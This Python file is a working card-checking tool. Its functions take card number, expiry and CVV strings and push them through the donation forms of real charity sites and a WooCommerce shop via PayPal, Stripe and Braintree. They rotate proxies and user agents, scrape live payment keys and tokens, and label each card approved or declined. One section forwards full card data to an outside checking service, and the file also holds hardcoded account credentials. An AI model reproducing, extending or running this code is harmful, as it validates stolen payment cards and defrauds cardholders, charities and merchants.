#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import re
import random
import base64
import time
import urllib3
import uuid
import asyncio
import aiohttp
from requests_toolbelt import MultipartEncoder

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# Helper: Format proxy for requests
# ============================================================================
def format_proxy(proxy):
    if not proxy:
        return None
    parts = proxy.split(':')
    if len(parts) == 2:
        url = f"http://{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    elif len(parts) == 4:
        url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return {'http': url, 'https': url}
    return None

# ============================================================================
# Simple random user‑agent generator
# ============================================================================
def generate_user_agent():
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(ua_list)

# ============================================================================
# Global constants for compatibility
# ============================================================================
PAYPAL_SITE = "http://bavashdesigns.com"
PAYPAL_AMOUNT = 0.05

# ============================================================================
# WORKING PAYPAL GATE (2africa.org)
# ============================================================================
def check_paypal_working(cc, proxy=None):
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        cc_num, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(yy) == 2:
            yy = '20' + yy

        SITE_URL = 'https://2africa.org/donate-now/'
        BASE_URL = 'https://2africa.org'
        UA = generate_user_agent()

        def extract_data():
            s = requests.Session()
            s.verify = False
            if proxy:
                s.proxies.update(format_proxy(proxy))
            headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}
            r = s.get(SITE_URL, headers=headers, timeout=30)
            html = r.text
            if 'givewp-route=donation-form-view' in html and 'givewp-route-signature' not in html:
                fid = re.search(r'form-id[=]+(\d+)', html)
                if fid:
                    iframe = f'{BASE_URL}/?givewp-route=donation-form-view&form-id={fid.group(1)}'
                    r2 = s.get(iframe, headers=headers, timeout=30)
                    html = r2.text

            fp = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
            if not fp:
                fp = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', html)
            fi = re.search(r'name="give-form-id" value="(.*?)"', html)
            if not fi:
                fi = re.search(r'name="give-form-id"\s+value="([^"]+)"', html)
            nc = re.search(r'name="give-form-hash" value="(.*?)"', html)
            if not nc:
                nc = re.search(r'name="give-form-hash"\s+value="([^"]+)"', html)
            if not all([fp, fi, nc]):
                return None

            enc = re.search(r'"data-client-token":"(.*?)"', html)
            if not enc:
                enc = re.search(r'data-client-token="([^"]+)"', html)
            if not enc:
                return None
            dec = base64.b64decode(enc.group(1)).decode('utf-8')
            au = re.search(r'"accessToken":"(.*?)"', dec)
            if not au:
                return None
            return {
                'fp': fp.group(1), 'fi': fi.group(1), 'nc': nc.group(1),
                'at': au.group(1), 'session': s
            }

        d = extract_data()
        if not d:
            return "Failed to extract form data", "ERROR"

        s = d['session']
        fp, fi, nc, at = d['fp'], d['fi'], d['nc'], d['at']

        email = f'drgam{random.randint(100,999)}@gmail.com'
        first_name = 'DRGAM'
        last_name = 'rights and'

        headers = {
            'origin': BASE_URL, 'referer': SITE_URL,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': UA, 'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '', 'give-form-id-prefix': fp, 'give-form-id': fi,
            'give-form-title': '', 'give-current-url': SITE_URL,
            'give-form-url': SITE_URL, 'give-form-minimum': '1.00',
            'give-form-maximum': '999999.99', 'give-form-hash': nc,
            'give-price-id': '3', 'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1', '_give_is_donation_recurring': '0',
            'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
            'give-amount': '1.00', 'give_stripe_payment_method': '',
            'payment-mode': 'paypal-commerce', 'give_first': first_name,
            'give_last': last_name, 'give_email': email,
            'card_name': 'drgam', 'card_exp_month': '', 'card_exp_year': '',
            'give_action': 'purchase', 'give-gateway': 'paypal-commerce',
            'action': 'give_process_donation', 'give_ajax': 'true',
        }
        s.post(f'{BASE_URL}/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        mp = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp.content_type
        r1 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order',
                    headers=headers, data=mp, timeout=30)
        try:
            tok = r1.json()['data']['id']
        except:
            return f"Order creation failed: {r1.text[:150]}", "ERROR"

        pp_headers = {
            'authority': 'cors.api.paypal.com', 'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-EG;q=0.8,en-US;q=0.7,en;q=0.6',
            'authorization': f'Bearer {at}',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site', 'user-agent': UA,
        }
        json_data = {
            'payment_source': {
                'card': {
                    'number': cc_num,
                    'expiry': f'{yy}-{mm}',
                    'security_code': cvv,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                }
            },
            'application_context': {'vault': False},
        }
        s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
               headers=pp_headers, json=json_data, timeout=30)

        mp2 = MultipartEncoder(fields={
            'give-honeypot': (None, ''), 'give-form-id-prefix': (None, fp),
            'give-form-id': (None, fi), 'give-form-title': (None, ''),
            'give-current-url': (None, SITE_URL), 'give-form-url': (None, SITE_URL),
            'give-form-minimum': (None, '1.00'), 'give-form-maximum': (None, '999999.99'),
            'give-form-hash': (None, nc), 'give-price-id': (None, '3'),
            'give-recurring-logged-in-only': (None, ''), 'give-logged-in-only': (None, '1'),
            '_give_is_donation_recurring': (None, '0'),
            'give_recurring_donation_details': (None, '{"give_recurring_option":"yes_donor"}'),
            'give-amount': (None, '1.00'), 'give_stripe_payment_method': (None, ''),
            'payment-mode': (None, 'paypal-commerce'), 'give_first': (None, first_name),
            'give_last': (None, last_name), 'give_email': (None, email),
            'card_name': (None, 'drgam'), 'card_exp_month': (None, ''),
            'card_exp_year': (None, ''), 'give-gateway': (None, 'paypal-commerce'),
        })
        headers['content-type'] = mp2.content_type
        r2 = s.post(f'{BASE_URL}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order=' + tok,
                    headers=headers, data=mp2, timeout=30)
        txt = r2.text

        if 'true' in txt or 'sucsess' in txt or 'COMPLETED' in txt:
            return "Charged $1.00", "APPROVED"
        decline_keywords = [
            'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'LOST_OR_STOLEN',
            'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
            'ACCOUNT_BLOCKED_BY_ISSUER', 'ORDER_NOT_APPROVED', 'PICKUP_CARD_SPECIAL_CONDITIONS',
            'PAYER_CANNOT_PAY', 'INSUFFICIENT_FUNDS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION',
            'TRANSACTION_NOT_PERMITTED', 'PAYMENT_DENIED', 'INVALID_TRANSACTION',
            'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
            'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CARD', 'CRYPTOGRAPHIC_FAILURE',
            'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT'
        ]
        for kw in decline_keywords:
            if kw in txt:
                return f"Declined: {kw}", "DECLINED"
        return f"Unknown response: {txt[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

check_paypal_fixed = check_paypal_working
check_paypal_general = check_paypal_working

# ============================================================================
# LOCAL STRIPE GATE (bambifoundation.org)
# ============================================================================
def check_stripe_api(cc, proxy=None):
    try:
        cc = cc.strip()
        parts = re.split(r'[ |/]', cc)
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        c = parts[0]
        mm = parts[1]
        ex = parts[2]
        cvc = parts[3]
        if len(ex) == 2:
            yy = ex
        elif len(ex) == 4:
            yy = ex[2:]
        else:
            yy = ex
        if len(yy) == 4:
            yy = yy[2:]

        user_agent = generate_user_agent()
        session = requests.Session()
        if proxy:
            session.proxies.update(format_proxy(proxy))
        session.verify = False

        headers = {'user-agent': user_agent}
        resp = session.get('https://bambifoundation.org/donate-now/', headers=headers, timeout=30)
        html = resp.text

        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', html).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', html).group(1)
        form_id = re.search(r'name="give-form-id" value="(.*?)"', html).group(1)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', html).group(1)

        headers = {
            'origin': 'https://bambifoundation.org',
            'referer': 'https://bambifoundation.org/donate-now/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Give a Donation',
            'give-current-url': 'https://bambifoundation.org/donate-now/',
            'give-form-url': 'https://bambifoundation.org/donate-now/',
            'give-form-minimum': '10.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '10.00',
            'give_tributes_type': 'DrGaM Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'In Honor Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': '',
            'payment-mode': 'stripe',
            'give_first': 'drgam',
            'give_last': 'drgam',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
            'action': 'give_process_donation',
            'give_ajax': 'true',
        }
        session.post('https://bambifoundation.org/wp-admin/admin-ajax.php', headers=headers, data=data, timeout=30)

        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
        resp = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, timeout=30)
        payment_method_id = resp.json()['id']

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://bambifoundation.org',
            'referer': 'https://bambifoundation.org/donate-now/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        params = {'payment-mode': 'stripe', 'form-id': form_id}
        data = {
            'give-honeypot': '',
            'give-form-id-prefix': form_prefix,
            'give-form-id': form_id,
            'give-form-title': 'Give a Donation',
            'give-current-url': 'https://bambifoundation.org/donate-now/',
            'give-form-url': 'https://bambifoundation.org/donate-now/',
            'give-form-minimum': '10.00',
            'give-form-maximum': '999999.99',
            'give-form-hash': form_hash,
            'give-price-id': 'custom',
            'give-amount': '10.00',
            'give_tributes_type': 'In Honor Of',
            'give_tributes_show_dedication': 'no',
            'give_tributes_radio_type': 'Drgam Of',
            'give_tributes_first_name': '',
            'give_tributes_last_name': '',
            'give_tributes_would_to': 'send_mail_card',
            'give-tributes-mail-card-personalized-message': '',
            'give_tributes_mail_card_notify_first_name': '',
            'give_tributes_mail_card_notify_last_name': '',
            'give_tributes_address_country': 'US',
            'give_tributes_mail_card_address_1': '',
            'give_tributes_mail_card_address_2': '',
            'give_tributes_mail_card_city': '',
            'give_tributes_address_state': 'MI',
            'give_tributes_mail_card_zipcode': '',
            'give_stripe_payment_method': payment_method_id,
            'payment-mode': 'stripe',
            'give_first': 'drgam',
            'give_last': 'drgam',
            'give_email': 'lolipnp@gmail.com',
            'give_comment': '',
            'card_name': 'drgam',
            'billing_country': 'US',
            'card_address': 'drgam sj',
            'card_address_2': '',
            'card_city': 'tomrr',
            'card_state': 'NY',
            'card_zip': '10090',
            'give_action': 'purchase',
            'give-gateway': 'stripe',
        }
        resp = session.post('https://bambifoundation.org/donate-now/', params=params, headers=headers, data=data, timeout=30, allow_redirects=True)
        text = resp.text

        if 'Thank you' in text or 'succeeded' in text:
            return "Charged $10.00", "APPROVED"
        if 'Your card was declined.' in text:
            return "Card declined", "DECLINED"
        if 'Your card has insufficient funds.' in text:
            return "Insufficient funds", "DECLINED"
        if 'Your card number is incorrect.' in text:
            return "Invalid card number", "DECLINED"
        if 'expired' in text.lower():
            return "Expired card", "DECLINED"
        error_match = re.search(r'<div class="give_error[^>]*>(.*?)</div>', text, re.DOTALL)
        if error_match:
            error_msg = re.sub(r'<[^>]+>', '', error_match.group(1)).strip()
            return f"Error: {error_msg}", "DECLINED"
        if 'error' in text.lower():
            return "Unknown error (see details)", "DECLINED"
        return f"Unknown response: {text[:200]}", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# B3 AUTH GATE (livresq.com)
# ============================================================================
EMAIL = "unknownentity_fst4i@mailsac.com"
PASSWORD = "sgFM5!pCG9RWA!F"

def h1():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h2():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h3():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/payment-methods/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def h4():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'cache-control': 'no-cache',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'upgrade-insecure-requests': '1',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
    }

def ajax_h():
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not-A.Brand";v="8", "Chromium";v="147", "Google Chrome";v="147"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'origin': 'https://livresq.com',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://livresq.com/en/my-account/add-payment-method/',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i',
    }

def bt_h(fp):
    return {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36',
        'Content-Type': 'application/json',
        'Authorization': f'Bearer {fp}',
        'Braintree-Version': '2018-05-10',
        'Origin': 'https://assets.braintreegateway.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://assets.braintreegateway.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }

def check_b3_auth(cc, proxy=None):
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) != 4:
            return "Invalid format", "ERROR"
        cc_num = parts[0]
        mm = parts[1]
        yy = parts[2]
        cvv = parts[3]
        if len(yy) == 2:
            yy = '20' + yy
        yy = yy[-2:]

        s = requests.Session()
        if proxy:
            s.proxies.update(format_proxy(proxy))
        s.verify = False

        r = s.get('https://livresq.com/en/my-account/', headers=h1())
        n = re.search(r'id="woocommerce-login-nonce"[^>]*value="([^"]+)"', r.text)
        if not n:
            return "Login nonce failed", "ERROR"
        d = {
            'username': EMAIL,
            'password': PASSWORD,
            'woocommerce-login-nonce': n.group(1),
            '_wp_http_referer': '/en/contul-meu/',
            'login': 'Log in',
            'trp-form-language': 'en'
        }
        r = s.post('https://livresq.com/en/my-account/', headers=h2(), data=d)
        if 'woocommerce-error' in r.text or not ('logout' in r.text.lower() or 'dashboard' in r.text.lower()):
            return "Login failed", "ERROR"

        r = s.get('https://livresq.com/en/my-account/add-payment-method/', headers=h3())
        an = re.search(r'name="woocommerce-add-payment-method-nonce"[^>]*value="([^"]+)"', r.text)
        cn = re.search(r'client_token_nonce["\']?\s*:\s*["\']([^"\']+)', r.text)
        if not cn:
            cn = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)', r.text)
        if not an or not cn:
            return "Failed to get nonces", "ERROR"
        an_val = an.group(1)
        cn_val = cn.group(1)

        d = {'action': 'wc_braintree_credit_card_get_client_token', 'nonce': cn_val}
        r = s.post('https://livresq.com/wp-admin/admin-ajax.php', headers=ajax_h(), data=d)
        if r.status_code != 200:
            return "Failed to get client token", "ERROR"
        j = r.json()
        dt = base64.b64decode(j['data']).decode('utf-8')
        fp = json.loads(dt).get('authorizationFingerprint')
        if not fp:
            return "Failed to get fingerprint", "ERROR"

        sid = str(uuid.uuid4())
        q = {
            'clientSdkMetadata': {'source':'client','integration':'custom','sessionId':sid},
            'query': '''mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                }
            }''',
            'variables': {
                'input': {
                    'creditCard': {'number':cc_num,'expirationMonth':mm,'expirationYear':yy,'cvv':cvv},
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        resp = s.post('https://payments.braintree-api.com/graphql', headers=bt_h(fp), json=q)
        if resp.status_code != 200:
            return "Tokenization failed", "ERROR"
        res = resp.json()
        token = res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
        if not token:
            return "Token not received", "ERROR"

        for _ in range(4):
            pd = {
                'payment_method': 'braintree_credit_card',
                'wc-braintree-credit-card-card-type': 'visa',
                'wc-braintree-credit-card-3d-secure-enabled': '',
                'wc-braintree-credit-card-3d-secure-verified': '',
                'wc-braintree-credit-card-3d-secure-order-total': '0.00',
                'wc_braintree_credit_card_payment_nonce': token,
                'wc_braintree_device_data': '',
                'wc-braintree-credit-card-tokenize-payment-method': 'true',
                'woocommerce-add-payment-method-nonce': an_val,
                '_wp_http_referer': '/en/contul-meu/add-payment-method/',
                'woocommerce_add_payment_method': '1',
                'trp-form-language': 'en'
            }
            r = s.post('https://livresq.com/en/my-account/add-payment-method/', headers=h4(), data=pd)
            if 'You cannot add a new payment method so soon' in r.text:
                time.sleep(15)
                continue
            em = re.search(r'<ul class="woocommerce-error"[^>]*>.*?<li>(.*?)</li>', r.text, re.DOTALL)
            if em:
                et = re.sub(r'\s+', ' ', em.group(1).strip())
                et = re.sub(r'&nbsp;', ' ', et)
                return et, "DECLINED"
            if any(x in r.text for x in ['Nice!', 'AVS', 'avs', 'payment method was added', 'successfully added']):
                return "APPROVED - Card Added", "APPROVED"
            sm = re.search(r'<div class="woocommerce-message"[^>]*>(.*?)</div>', r.text, re.DOTALL)
            if sm:
                st = re.sub(r'<[^>]+>', '', sm.group(1).strip())
                st = re.sub(r'\s+', ' ', st)
                return st, "APPROVED"
            time.sleep(15)
        return "Unknown response", "ERROR"

    except Exception as e:
        return f"Exception: {str(e)[:100]}", "ERROR"

# ============================================================================
# GATEWAY API (external service)
# ============================================================================
GATEWAY_API_BASE = "https://onyxenvbot.up.railway.app"
API_KEY = "yashikaaa"

def _check_gateway_api(cc, gateway_path, gateway_name):
    try:
        cc = cc.strip()
        parts = cc.split('|')
        if len(parts) < 4:
            return "Invalid format", "ERROR"
        import urllib.parse
        cc_encoded = urllib.parse.quote(cc)
        url = f"{GATEWAY_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"
        response = requests.get(url, timeout=120, verify=False)
        response.raise_for_status()
        data = response.json()
        result_status = data.get('status', '').lower()
        response_msg = data.get('response', '')
        if result_status == 'approved':
            return response_msg, "APPROVED"
        else:
            return response_msg if response_msg else "Declined", "DECLINED"
    except Exception:
        return "Gateway error", "ERROR"

def check_chaos(cc, proxy=None):
    return _check_gateway_api(cc, "chaos", "Chaos Auth")

def check_adyen(cc, proxy=None):
    return _check_gateway_api(cc, "adyen", "Adyen Auth")

def check_app_auth(cc, proxy=None):
    return _check_gateway_api(cc, "app-auth", "App Based Auth")

def check_payflow(cc, proxy=None):
    return _check_gateway_api(cc, "payflow", "Payflow")

def check_random(cc, proxy=None):
    return _check_gateway_api(cc, "random", "Random Auth")

def check_shopify_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "shopify", "Shopify")

def check_skrill(cc, proxy=None):
    return _check_gateway_api(cc, "skrill", "Skrill")

def check_stripe_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "stripe", "Stripe")

def check_arcenus(cc, proxy=None):
    return _check_gateway_api(cc, "arcenus", "Arcenus")

def check_random_stripe(cc, proxy=None):
    return _check_gateway_api(cc, "random-stripe", "Random Stripe")

def check_razorpay(cc, proxy=None):
    return _check_gateway_api(cc, "razorpay", "RazorPay")

def check_payu(cc, proxy=None):
    return _check_gateway_api(cc, "payu", "PayU")

def check_sk_gateway(cc, proxy=None):
    return _check_gateway_api(cc, "sk", "SK Gateway")

def check_paypal_onyx(cc, proxy=None):
    return _check_gateway_api(cc, "paypal", "PayPal")

def check_braintree_api(cc, proxy=None):
    return _check_gateway_api(cc, "braintree", "Braintree API")
